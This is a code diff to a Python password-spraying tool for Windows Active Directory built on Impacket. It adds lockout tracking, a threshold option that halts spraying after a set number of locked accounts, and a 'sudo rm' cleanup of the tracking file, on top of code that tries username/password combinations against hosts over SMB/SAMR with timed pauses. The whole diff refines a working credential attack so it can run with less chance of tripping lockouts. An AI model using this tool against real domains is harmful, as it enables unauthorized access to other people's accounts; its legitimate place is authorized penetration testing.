@@ -69,6 +69,10 @@ def sendit(username, password, domain, remoteName, remoteHost, hashes=None,aesKe
         try:
             samr.connect()
         except Exception as e:
+            if str(e).find('STATUS_ACCOUNT_LOCKED_OUT') != -1:
+                with open('locked-slowspray', 'a') as f:
+                    f.write('Locked\n')
+                    f.close()
             if options.s == False:
                 print(red_minus, remoteName.ljust(20), upasscombo.ljust(30), str(e)[:str(e).find("(")])
             if options.o is not None:
@@ -98,28 +102,44 @@ def sendit(username, password, domain, remoteName, remoteHost, hashes=None,aesKe
                     f.close()
 
 def mt_execute(username, host_ip, passwd, doit):  # multithreading requires a function
-    try:
-        sendit(username, passwd, options.d, host_ip, host_ip, options.H, None, False, None, int(445))
-    except Exception as e:
-        print(str(e))
-        if options.o is not None:
-            with open(options.o, 'a') as f:
-                f.write(str(e) + '\n')
-                f.close()
+    skip = False
+    try: # stop lockouts before they get too high
+        with open('locked-slowspray', 'r') as f:
+            dat = f.readlines()
+            f.close()
 
-    if options.delay is not None:
-        sleep(options.delay)
+        if len(dat) > options.l:
+            skip = True
+            print('{}[!]{} Stopping because account lockout threshold was hit'.format(color_RED, color_reset))
+            sys.exit(1)
+    except:
+        pass
 
-    if doit == True:
-        sleep(1)
-        currtime = datetime.datetime.now()
-        exptime = datetime.timedelta(minutes=options.pd)
-        newtime = currtime + exptime
-        print("Hit our max see you in {} mins from {} will resume at {}".format(options.pd, currtime.strftime("%H:%M:%S"), newtime.strftime("%H:%M:%S")))
+    if skip == False:
+        try:
+            sendit(username, passwd, options.d, host_ip, host_ip, options.H, None, False, None, int(445))
+        except Exception as e:
+            print(str(e))
+            if options.o is not None:
+                with open(options.o, 'a') as f:
+                    f.write(str(e) + '\n')
+                    f.close()
+
+        if options.delay is not None:
+            sleep(options.delay)
+
+        if doit == True:
+            sleep(1)
+            currtime = datetime.datetime.now()
+            exptime = datetime.timedelta(minutes=options.pd)
+            newtime = currtime + exptime
+            print("Hit our max see you in {} mins from {} will resume at {}".format(options.pd, currtime.strftime("%H:%M:%S"), newtime.strftime("%H:%M:%S")))
 
 
 if __name__ == '__main__':
     print(datetime.datetime.now().strftime("%D %H:%M:%S"))
+    if os.path.isfile('locked-slowspray'):
+        os.system('sudo rm locked-slowspray')
     parser = argparse.ArgumentParser(add_help=True, description="Impacket made password sprayer for Windows AD")
     parser.add_argument('-u', action='store', help='Username or path to file containing usernames 1 per line')
     parser.add_argument('-p', action='store', help='Password to try or file of passwords')
@@ -137,6 +157,7 @@ if __name__ == '__main__':
     parser.add_argument('-method', action='store', choices=['random', 'sequence'], default='random',help='IP to check the account against')
     parser.add_argument('-ip', action='store', help='Your local ip or interface')
     parser.add_argument('-timeout', action='store', default=5, type=int, help='Timeout for each attempt (Default=5)')
+    parser.add_argument('-l', action='store', default=5, type=int, help='Max amount of locked accounts before we stop(Default=5)')
 
     if len(sys.argv) == 1:
         parser.print_help()
